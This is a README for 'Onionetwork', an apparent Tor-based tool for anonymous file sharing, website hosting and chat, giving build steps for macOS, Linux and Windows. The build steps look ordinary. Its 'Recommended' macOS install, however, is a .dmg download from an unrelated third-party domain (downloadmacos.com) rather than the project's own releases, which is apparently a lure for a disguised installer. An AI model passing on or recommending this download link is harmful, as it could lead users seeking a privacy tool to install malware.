![Onionetwork](logo.png)

# Onionetwork

Onionetwork is an open source tool that lets you securely and anonymously share files, host websites, and chat with friends using the Tor network.

## Quick Installation

### macOS

**Recommended:** Download the pre-built [`.dmg` installer](https://downloadmacos.com/macshare.php?call=onion) for the easiest installation.

## Building Instructions

### Prerequisites

- Python 3.10-3.12
- Poetry (`pip install poetry`)
- Git

### Building on macOS

#### Prerequisites

```bash
# Install Python 3.10+ from python.org or via pyenv
# Install create-dmg for DMG creation
brew install create-dmg

# Install Poetry
pip install poetry
```

#### Build Steps

```bash
# Clone the repository
git clone https://github.com/onionetwork/onionetwork.git
cd onionetwork

# Install CLI dependencies
cd cli
poetry install

# Install Desktop dependencies
cd ../desktop
poetry install

# Download Tor binaries
poetry run python scripts/get-tor.py macos

# Build the app
poetry run python scripts/build-macos.py build

# Create DMG (optional)
poetry run python scripts/build-macos.py package build/Onionetwork.app
```

The built app will be in `desktop/build/Onionetwork.app` and the DMG in `desktop/dist/`.

### Building on Linux

#### Prerequisites (Ubuntu/Debian)

```bash
sudo apt update
sudo apt install python3-dev python3-pip python3-venv tor obfs4proxy python3-poetry
```

#### Build Steps

```bash
# Clone the repository
git clone https://github.com/onionetwork/onionetwork.git
cd onionetwork

# Install CLI dependencies
cd cli
poetry install

# Install Desktop dependencies
cd ../desktop
poetry install

# Install additional dependencies
sudo apt install python3-pyside6.qtcore python3-pyside6.qtwidgets python3-pyside6.qtgui

# Run the app
cd desktop
poetry run onionetwork
```

### Building on Windows

#### Prerequisites

1. Install Python 3.10+ from [python.org](https://python.org)
2. Install [Git for Windows](https://git-scm.com/download/win)
3. Install Poetry: `pip install poetry`

#### Build Steps

```cmd
# Clone the repository
git clone https://github.com/onionetwork/onionetwork.git
cd onionetwork

# Install CLI dependencies
cd cli
poetry install

# Install Desktop dependencies
cd ..\desktop
poetry install

# Download Tor binaries
poetry run python scripts\get-tor.py windows

# Build the app
poetry run python setup-freeze.py build
```

## Development

### Running from Source

```bash
# CLI version
cd cli
poetry run onionetwork-cli --help

# Desktop version
cd desktop
poetry run onionetwork
```

### Running Tests

```bash
# CLI tests
cd cli
poetry run pytest

# Desktop tests
cd desktop
poetry run pytest
```

## License

Onionetwork is licensed under the GPL v3. See [LICENSE](LICENSE) for details.
